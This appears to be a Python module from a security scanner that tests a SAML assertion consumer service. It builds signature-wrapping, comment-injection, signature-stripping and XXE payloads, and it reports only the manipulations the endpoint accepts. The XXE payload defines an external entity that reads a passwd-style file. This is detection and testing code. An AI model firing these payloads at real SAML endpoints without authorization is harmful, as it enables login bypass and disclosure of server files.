"""U-DEEP-12 — SAML Attacks.

Family: SAML. Enterprise-only, canary-modeled: no real XML-signature
machinery is exercised. Detection principle: ACCEPTANCE OVER
STRUCTURE — a manipulated response is only a finding when the ACS
accepts it (authenticates an identity the baseline's signature
coverage or entity handling should have prevented), never a mere echo
of the submitted XML.

Sub-families (spec verbatim): XML Signature Wrapping (XSW), comment
injection, signature stripping, XXE in SAML. Zero live network: the
transport is the injected ``send(method, path, body)`` callable;
findings are advisory evidence only (DEEP-L-8 ADVISORY_ONLY).
"""
from __future__ import annotations

import re
from dataclasses import dataclass

ATTACKER_IDENTITY = "attacker@target"

# The modeled entity-resolution canary: content the submitted response
# never carried, whose appearance in the ACS's response is the XXE
# effect (EFFECT OVER ECHO).
XXE_CANARY_CONTENT = "root:x:0:0"

_ATTACKER_ASSERTION = (
    "<Assertion ID='_attacker'><Subject>"
    f"<NameID>{ATTACKER_IDENTITY}</NameID></Subject></Assertion>")

_XXE_DOCTYPE = ("<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "
                "\"file:///etc/target/passwd\"]>")


def _build_xsw(xml: str) -> str:
    """Wrap: attacker assertion first, signed original preserved."""
    return xml.replace("<samlp:Response>",
                       "<samlp:Response>" + _ATTACKER_ASSERTION, 1)


def _build_comment(xml: str) -> str:
    """Inject an XML comment into the first NameID."""
    return re.sub(r"<NameID>(.*?)</NameID>",
                  r"<NameID>\1<!--x--></NameID>", xml, count=1)


def _build_stripped(xml: str) -> str:
    """Remove the Signature element entirely."""
    start = xml.find("<Signature")
    end = xml.find("</Signature>")
    if start == -1 or end == -1:
        return xml
    return xml[:start] + xml[end + len("</Signature>"):]


def _build_xxe(xml: str) -> str:
    """Prepend a DOCTYPE and plant the entity reference in the NameID."""
    return _XXE_DOCTYPE + xml.replace("<NameID>", "<NameID>&xxe;", 1)


# Spec corpus, verbatim structure (U-DEEP-12): four sub-families.
SAML_ATTACKS: dict[str, dict] = {
    "xsw": {
        "description": "XML Signature Wrapping: a second, attacker-"
                       "controlled assertion rides along while the "
                       "signature is verified against the original",
        "build": _build_xsw,
    },
    "comment_injection": {
        "description": "XML comments inside NameID split identity "
                       "extraction from signature canonicalization",
        "build": _build_comment,
    },
    "signature_stripping": {
        "description": "The Signature element is removed; servers that "
                       "do not require a signature accept the "
                       "unsigned assertion",
        "build": _build_stripped,
    },
    "xxe": {
        "description": "DOCTYPE with an external entity resolved by "
                       "the ACS's XML parser",
        "build": _build_xxe,
    },
}

SEVERITY_BY_SUBFAMILY = {
    "xsw": "critical",
    "comment_injection": "high",
    "signature_stripping": "critical",
    "xxe": "critical",
}


@dataclass(frozen=True)
class SamlFinding:
    subfamily: str
    severity: str
    evidence: tuple[str, ...]
    payload: str
    family: str = "SAML"
    confidence: float = 0.9
    statement: str = ""
    success_indicator: str = ""


class SamlDetector:
    """Probes the ACS with one manipulated response per sub-family and
    reports only accepted manipulations."""

    _ENDPOINT = "/acs"

    def __init__(self, send, saml_response: str) -> None:
        self._send = send
        self._saml_response = saml_response

    # ------------------------------------------------------------------

    def scan(self) -> list[SamlFinding]:
        baseline = self._send("POST", self._ENDPOINT,
                              {"SAMLResponse": self._saml_response})
        if baseline.status_code >= 400:
            # ACCEPTANCE OVER STRUCTURE: nothing can be confirmed where
            # the unmodified response itself is rejected.
            return []
        baseline_line = ("baseline: accepted (the unmodified response "
                         "authenticates)")
        findings: list[SamlFinding] = []
        for subfamily in ("xsw", "comment_injection",
                          "signature_stripping", "xxe"):
            payload = SAML_ATTACKS[subfamily]["build"](self._saml_response)
            probe = self._send("POST", self._ENDPOINT,
                               {"SAMLResponse": payload})
            if not self._accepted(subfamily, payload, probe):
                continue
            findings.append(self._finding(
                subfamily, payload, baseline_line, probe))
        return findings

    # ------------------------------------------------------------------

    @staticmethod
    def _accepted(subfamily: str, payload: str, probe) -> bool:
        if probe.status_code >= 400:
            return False
        if subfamily == "xsw":
            # the attacker identity was authenticated out of a response
            # whose signature covered only the original assertion
            return ATTACKER_IDENTITY in probe.body
        if subfamily == "comment_injection":
            # identity extracted with the comment stripped
            return ATTACKER_IDENTITY in probe.body
        if subfamily == "signature_stripping":
            # an unsigned assertion was accepted at all
            return "<Signature" not in payload
        if subfamily == "xxe":
            # effect over echo: resolved content the request never
            # carried appears in the response
            return (XXE_CANARY_CONTENT in probe.body
                    and XXE_CANARY_CONTENT not in payload)
        return False

    def _finding(self, subfamily: str, payload: str, baseline_line: str,
                 probe) -> SamlFinding:
        statements = {
            "xsw": (
                "XML Signature Wrapping: the ACS authenticated the "
                "attacker assertion while the signature was verified "
                "against the original — SAML XSW (advisory; verify "
                "against an authorized target)."),
            "comment_injection": (
                "The ACS's identity extraction and its signature "
                "canonicalization disagree on XML comments — SAML "
                "comment injection (advisory; verify against an "
                "authorized target)."),
            "signature_stripping": (
                "The ACS accepted an assertion with the Signature "
                "element removed — signature verification is not "
                "enforced (advisory; verify against an authorized "
                "target)."),
            "xxe": (
                "The ACS's XML parser resolved an external entity and "
                "the response carried content the request never "
                "contained — XXE in SAML (advisory; verify against an "
                "authorized target)."),
        }
        indicators = {
            "xsw": f"authenticated session issued for {ATTACKER_IDENTITY}",
            "comment_injection": (
                "authenticated identity differs from the signed NameID"),
            "signature_stripping": (
                "unsigned assertion accepted by the ACS"),
            "xxe": ("response carries resolved entity content absent "
                    "from the submitted response"),
        }
        evidence = [
            baseline_line,
            f"probe: {probe.body}",
        ]
        if subfamily == "xxe":
            evidence.append(
                f"resolved canary content: {XXE_CANARY_CONTENT}")
        return SamlFinding(
            subfamily=subfamily,
            severity=SEVERITY_BY_SUBFAMILY[subfamily],
            evidence=tuple(evidence),
            payload=payload,
            statement=statements[subfamily],
            success_indicator=indicators[subfamily],
        )
